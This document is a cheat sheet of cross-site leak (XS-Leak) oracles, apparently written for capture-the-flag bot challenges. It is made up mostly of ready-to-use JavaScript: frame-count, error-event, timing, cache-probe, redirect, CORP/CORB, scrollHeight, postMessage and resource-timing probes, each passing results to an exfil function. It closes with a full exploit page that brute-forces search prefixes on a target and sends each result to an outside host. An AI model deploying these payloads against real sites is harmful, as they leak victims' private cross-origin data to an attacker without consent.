# Classic oracles — the client-side measurements

When the bot visits YOUR page, your JS measures a side-channel.
Each oracle, its payload, and its control.

---

## 1. `window.frames.length` — the frame-count oracle

```js
// one <iframe> per matching result — the count is readable cross-origin
var f=document.createElement('iframe');
f.src='https://t/search?q='+guess;
f.onload=function(){
  var n=f.contentWindow.frames.length;
  exfil(guess+'='+n);   // n>0 = hit, n=0 = miss
};
document.body.appendChild(f);
```

Control: a query that always matches vs one that never does.

## 2. `onload`/`onerror` — the error-event oracle

```js
// a resource that 200s on a hit, 404s on a miss
var i=new Image();
i.onload=()=>exfil(guess+'=hit');
i.onerror=()=>exfil(guess+'=miss');
i.src='https://t/api/search?q='+guess;
// or a <script>, <link>, <iframe> — same events
```

## 3. The timing oracle — a slow-vs-fast response

```js
var t0=performance.now();
fetch('https://t/api/search?q='+guess,{mode:'no-cors'})
 .finally(()=>{
   var t=performance.now()-t0;
   exfil(guess+'='+Math.round(t));
 });
// or a navigation timing, a resource timing
```

## 4. The cache-probe oracle — is it cached

```js
// a resource the victim's browser cached — a second load is faster
var t0=performance.now();
var i=new Image();
i.onload=function(){
  var t=performance.now()-t0;
  exfil('cached='+guess+' t='+Math.round(t));
};
i.src='https://t/resource/'+guess+'?cb='+Math.random();
```

## 5. The history/:visited oracle — was the URL visited

```css
/* a :visited link's repaint cost differs from an unvisited one */
a:visited{... a heavy style ...}
```

```js
// measure the repaint timing of a link to the searched URL vs a control
```

## 6. The window.open oracle — did it open

```js
var w=window.open('https://t/search?q='+guess);
// a blocked pop-up (a redirect/CSP) vs an opened window — the handle
setTimeout(()=>{try{exfil('open='+(w&&!w.closed))}catch(e){exfil('err')}},2000);
```

## 7. The redirect oracle — did it navigate

```js
// a page that redirects on a hit — the final URL or the navigation
// count differs
window.onpageshow=function(e){if(e.persisted)exfil('nav')}
```

## 8. The CORP/CORB oracle — a subresource block

```js
// a CORP-same-origin or CORB-sniffed resource — a load error differs
var i=new Image();
i.onload=()=>exfil('loaded');
i.onerror=()=>exfil('blocked');
i.src='https://t/resource/'+guess;
```

## 9. The scroll/size oracle — a content-length diff

```js
// an iframe whose scrollHeight differs with the content
var f=document.createElement('iframe');
f.src='https://t/page?q='+guess;
f.onload=function(){
  try{exfil('h='+f.contentWindow.document.body.scrollHeight)}
  catch(e){exfil('xorigin')}
};
```

## 10. The postMessage oracle — a broadcast

```js
window.addEventListener('message',e=>{
  exfil('msg='+JSON.stringify(e.data));
});
// a page that postMessages on a state-change
```

## 11. The performance-API oracle — a resource-timing read

```js
// a resource's timing entry — a fetch-duration leak
performance.getEntriesByName('https://t/resource/'+guess).forEach(
  e=>exfil(e.name+'='+e.duration));
```

## 12. The oracle-payloads — the exploit page skeleton

```html
<!doctype html><script>
function exfil(d){fetch('https://a/?'+encodeURIComponent(d))}
var guesses=['ab','ac','ad','ae'];   // the candidate prefix+char
var i=0;
function go(){
  if(i>=guesses.length)return;
  var g=guesses[i++];
  var f=document.createElement('iframe');
  f.src='https://t/search?q='+g;
  f.onload=function(){
    var n=f.contentWindow.frames.length;
    exfil(g+':'+n); go();
  };
  document.body.appendChild(f);
}
go();
</script>
```

## 13. The classic-oracle selection table

```text
the response varies by        the oracle
a frame count                 frames.length
a 200/404/500                 onload/onerror
a redirect                    history/:visited / window.open
a timing                      performance.now() / resource-timing
a cached resource             cache-probe timing
a content-length              a scrollHeight measurement
a CORP/CORB block             a subresource load error
a server-state change         — not classic — a sealed channel
a reflected attribute         — not classic — a CSS oracle
```
